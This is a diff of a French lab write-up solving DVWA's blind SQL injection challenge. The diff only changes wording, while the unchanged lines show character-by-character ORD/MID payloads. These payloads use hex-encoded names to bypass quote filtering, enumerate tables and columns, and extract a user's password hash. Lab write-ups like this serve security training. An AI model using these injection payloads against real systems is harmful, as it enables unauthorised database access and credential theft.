@@ -8,15 +8,15 @@ De plus, la requête n'est plus de type **`GET`** mais de type **`POST`** :
 
 ![](../../../../.gitbook/assets/3891b089c6a39abd4bbb087fb2946b0e.png)
 
-Pour se simplifier la vie, on transforme à la volée le champ `<select>` en champ `<inpu/>` \(via Burp ici\) :
+Pour se simplifier la vie, je transforme à la volée le champ `<select>` en champ `<inpu/>` (via Burp ici) :
 
 ![](../../../../.gitbook/assets/4d32088f3c989162713d34226c54cb3c.png)
 
-On confirme ensuite l'injection ainsi que son type, numérique :
+Je confirme ensuite l'injection ainsi que son type, numérique :
 
 ![](../../../../.gitbook/assets/1f4f6f48508dba119ff4d156490ef9fc.png)
 
-On détermine également le nom de la base :
+Je détermine également le nom de la base :
 
 ![](../../../../.gitbook/assets/25ec934adcc5a98cdc1379779ebfb3e6.png)
 
@@ -31,7 +31,7 @@ La prochaine action est de récupérer les noms des tables, mais il semble que l
 
 ![](../../../../.gitbook/assets/63fe1d5e7910343ba81b717d2ed40e92.png)
 
-Il nous faut donc trouver un moyen de contourner cette limitation. Pour cela la chaîne de caractères sera écrite en notation hexadécimale \(`0x64767761` est équivalent à `dvwa`\) :
+Il me faut donc trouver un moyen de contourner cette limitation. Pour cela la chaîne de caractères sera écrite en notation hexadécimale (`0x64767761` est équivalent à `dvwa`) :
 
 ![](../../../../.gitbook/assets/264917ef13056bf1b12a8d8fa9f2613e.png)
 
@@ -59,7 +59,7 @@ Puis pour la table `users` :
 1 AND ORD(MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x64767761 LIMIT 1,1),5,1)) = 115 // s
 ```
 
-Ensuite, on retrouve le nombre de colonnes de la table `users` \(`0x7573657273` pour `users`\) :
+Ensuite, je retrouve le nombre de colonnes de la table `users` (`0x7573657273` pour `users`) :
 
 ```sql
 1 AND ORD(MID((SELECT COUNT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761),1,1)) = 56  // 8 
@@ -87,7 +87,7 @@ Ainsi que la colonne `password` :
 1 AND ORD(MID((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 4,1),8,1)) = 100  // d
 ```
 
-Finalement, le mot de passe de l'utilisateur Pablo \(équivalent à `0x7061626C6F`\) :
+Finalement, le mot de passe de l'utilisateur Pablo (équivalent à `0x7061626C6F`) :
 
 ```sql
 1 AND ORD(MID((SELECT password FROM dvwa.users WHERE user=0x7061626C6F),1,1)) = 48    // 0 
@@ -127,4 +127,3 @@ Finalement, le mot de passe de l'utilisateur Pablo \(équivalent à `0x7061626C6
 Soit :
 
 ![](../../../../.gitbook/assets/6d75b9397dbe0c57747a75e7b2a5485c.png)
-
